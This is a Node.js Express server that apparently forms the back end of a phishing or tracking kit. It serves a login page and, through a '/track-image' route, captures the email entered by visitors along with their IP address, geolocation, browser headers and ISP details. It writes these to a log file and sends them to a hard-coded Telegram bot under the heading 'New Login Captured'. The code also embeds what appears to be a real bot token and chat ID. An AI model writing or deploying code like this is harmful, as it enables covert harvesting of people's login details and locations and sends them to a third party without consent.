const express = require("express");
const axios = require("axios");
const fs = require("fs");
const path = require("path");
const app = express();

// Port for Render or local
const port = process.env.PORT || 3000;

// Telegram Bot credentials
const telegramBotToken = "8054463444:AAGU44U27Hly1LPgMqM2H_5fYwVQCbgLFME";
const telegramChatId = "1387832458";

app.use(express.json()); // for parsing application/json
app.use(express.static(path.join(__dirname))); // to serve login.html

// Serve login page
app.get("/", (req, res) => {
  res.sendFile(__dirname + "/login.html");
});

// Track route — triggered from login form
app.post("/track-image", async (req, res) => {
  const email = req.body.email || "Not Provided";
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const timestamp = new Date().toISOString();
  const log = `IP: ${ip} | Email: ${email} | Time: ${timestamp}\n`;

  fs.appendFile("ip_logs.txt", log, (err) => {
    if (err) console.error("Log error:", err);
  });

  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    if (response.data.status === "fail") {
      throw new Error(`API failed: ${response.data.message}`);
    }

    const {
      country = "Unknown",
      countryCode = "Unknown",
      region = "Unknown",
      regionName = "Unknown",
      city = "Unknown",
      zip = "Not Available",
      lat = "Unknown",
      lon = "Unknown",
      timezone = "Unknown",
      isp = "Unknown",
      org = "Unknown",
      as = "Unknown",
    } = response.data;

    const userAgent = req.headers["user-agent"] || "Unknown";
    const language = req.headers["accept-language"] || "Unknown";
    const referer = req.headers["referer"] || "Direct Link";
    const connection = req.headers["connection"] || "Unknown";
    const host = req.headers["host"] || "Unknown";

    const detailedData = `
📧 Email: ${email}
🌐 IP Address: ${ip}
📍 Country: ${country} (${countryCode})
🏙️ State/Region: ${regionName} (${region})
🌆 City: ${city}
📮 ZIP: ${zip}
📌 Latitude: ${lat}
📌 Longitude: ${lon}
🕒 Timezone: ${timezone}
🌐 ISP: ${isp}
🏢 Organization: ${org}
🔗 ASN: ${as}
🧠 User-Agent: ${userAgent}
🗣️ Language: ${language}
🔁 Referer: ${referer}
🔌 Connection: ${connection}
🖥️ Host: ${host}
🕓 Timestamp: ${timestamp}
    `;

    await axios.get(
      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
      {
        params: {
          chat_id: telegramChatId,
          text: `🚨 New Login Captured:\n${detailedData}`,
        },
      }
    );
  } catch (err) {
    console.error("Tracking Error:", err.message);
    await axios.get(
      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
      {
        params: {
          chat_id: telegramChatId,
          text: `❌ Error fetching info for IP: ${ip} - ${err.message}`,
        },
      }
    );
  }

  res.status(200).send("Logged Successfully");
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
